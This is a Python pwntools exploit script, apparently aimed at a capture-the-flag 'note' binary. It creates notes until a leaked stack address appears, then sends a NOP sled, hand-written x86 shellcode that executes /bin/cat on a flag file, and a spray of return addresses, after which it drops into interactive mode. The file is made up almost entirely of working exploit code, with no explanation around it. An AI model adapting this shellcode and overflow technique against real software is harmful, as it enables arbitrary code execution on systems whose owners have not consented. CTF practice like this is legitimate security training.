```py
#!/usr/bin/python
from pwn import *
import struct, re, binascii

# Global Settings
DEBUG = True
CREATE = "1"
WRITE = "2"
DELETE = "4"
LEAVE = "5"
EXIT = "exit"
NOTE_NO = "note no?"
MAX_BYTES = "MAX : 4096 byte)"
FULL = "memory sults are fool"
FILE = "file /root/CTF/note-ctf/target"
RUN = "run"
GDB = "/usr/bin/gdb"
BREAK_1 = "break *write_note+125"
STACK_START = 0xfffdd000
STACK_END = 0xffffe000
TARGET_ADDR = 0xffff612c

def p(x):
	return struct.pack("<L",x)
	
def u(x):
	return struct.pack(">I",x)
	
# Exploit
class Exp(object):		
	def __init__(self):
		self.address_regex = "(?<=\[)(.*?)(?=\])"
		self.note_number_regex = "(?<=no )(.*?)(?=\[)"
		
		if(DEBUG):
			self.proc = process(GDB)				
			self.proc.sendline(FILE)			
			self.proc.sendline(BREAK_1)				
			self.proc.sendline("break *main+235")			
			self.proc.sendline(RUN)				
			log.success("[*] Opening debugging process")
		else:
			self.proc = process("/root/CTF/note-ctf/target")		
			log.success("[*] Opening process")
		
	def getShellCode(self, address):						
		padding = "\x90"*100		
		shellcode = (
		"\x31\xc0" #                	xor    eax,%eax
		"\x50" #                   		push   eax
		"\x68\x2f\x63\x61\x74" #       	push   0x7461632f ; /bin/cat
		"\x68\x2f\x62\x69\x6e" #       	push   0x6e69622f
		"\x89\xe3" #                	mov    ebx, esp
		"\x50" #                	   	push   eax
		"\x68\x66\x6c\x61\x67" #       	push   0x666c6167 ; flag
		"\x89\xe1" #                	mov    ecx, esp
		"\x50" #            	       	push   eax
		"\x51" #        	           	push   ecx
		"\x53" #    	               	push   ebx
		"\x89\xe1" #                	mov    esp,%ecx
		"\xb0\x0b" #                	mov    al, 0xb
		"\xcd\x80" #					int    0x80		
		)					
		
		address = int(address, 16)
		size = STACK_END - STACK_START
		offset = len(shellcode) + (address - STACK_START)
		ropsize = ((size - offset) / 4) - 1
		rop = struct.pack("<I", address)
		rops = rop*(ropsize-100)
		#rops = rop*(800)
		
		log.success("Building shellcode:\n[*] Address: {0}\n[*] Offset: {1}\n[*] Ropsize: {2}".format(rop.encode('hex'),str(offset),str(ropsize)))
		log.success("\\x"+"\\x".join(re.findall("..",binascii.hexlify(shellcode))))
		payload = padding + shellcode + rops
		return payload
		
	def checkAddress(self, address):
		match = False
		try:
			addy = int(address,16)
			if(DEBUG):
				if("fff" in struct.pack(">I", addy).encode('hex')):
					log.success("\t\t[*][Address]:{0} [Stack]:{1} ".format(
							struct.pack(">I", addy).encode('hex'),
							struct.pack(">I", STACK_START).encode('hex'),		
						))	
			if(addy >= STACK_START and addy < STACK_END):
				offset = addy - STACK_START
				log.success("\t\t[*][Got stack address]:{0} [*][Offset]:{1}".format(
						struct.pack(">I", addy).encode('hex'),
						struct.pack(">I", offset).encode('hex')
					))					
				match = True			
		except Exception, e:
			log.failure("\t[*] Address failed {0}".format(str(e)))
			
		return match
		
	def getAddress(self,string):			
		address = None
		p = re.compile(self.address_regex, re.MULTILINE)
		search = re.findall(p, string)
		if(len(search)>0):
			address = search[0]
		
		return address
		
	def getNote(self,string):
		number = None
		p = re.compile(self.note_number_regex, re.MULTILINE|re.DOTALL)
		search = re.findall(p, string)
		if(len(search)>0):
			number = search[0]
		
		#log.success("[*] Note: {0}".format(str(number)))
		return number			
	
	def search(self):
		attempts = 1		
		while True:				
			self.proc.recvuntil("5. exit")					
			log.success("\t[*] Creating notes")			
			result = ""			
			for n in range(256):				
				self.proc.sendline("1") # create
				output = self.proc.recvuntil("exit\n", timeout=0.001)				
				address = self.getAddress(output)
				note = self.getNote(output)					
				
				if(address != None):
					#log.success(u(int(address, 16)).encode('hex'))
					if(self.checkAddress(address)):
						self.proc.sendline("2")			
						self.proc.recvuntil("note no?\n", timeout=0.001)				
						self.proc.sendline(str(n))
						self.proc.recvuntil("MAX : 4096 byte)\n", timeout=0.001)				
						self.proc.sendline(self.getShellCode(address))												
						self.proc.sendline("5")
						print self.proc.recv(timeout=1.0)
						log.success("Might be lucky...")
						#self.proc.interactive()
						if(DEBUG):
							crash = self.proc.recvuntil("gdb-peda$", timeout=0.001)				
							if("Invalid $PC address: 0x0" in crash):
								log.failure("No dice...restarting..:\n\n:{0}".format(crash))	
								self.proc.recv(timeout=0.001)							
								self.proc.sendline("run")
								return False
							else:
								log.success("Might be lucky...Going interactive:\n\n{0}".format(crash))
								self.proc.interactive()			
						else:
							log.success("Might be lucky...Going interactive...")
							self.proc.interactive()			
										
			log.success("\t[*] Deleting notes")				
			
			self.proc.recv(timeout=0.1)
			for n in range(256):				
				self.proc.sendline("4")							
				self.proc.recvuntil("note no?", timeout=0.001)				
				self.proc.sendline(str(n)+"\n")		
				self.proc.recvuntil("5. exit", timeout=0.001)				
				
			log.failure("\t[*] Failed attempt: {0}".format(str(attempts)))
			attempts += 1							
			self.proc.sendline("5")
			
			if(DEBUG):
				self.proc.recvuntil("gdb-peda$", timeout=0.001)				
				self.proc.sendline("run")			

Exp().search()
	
```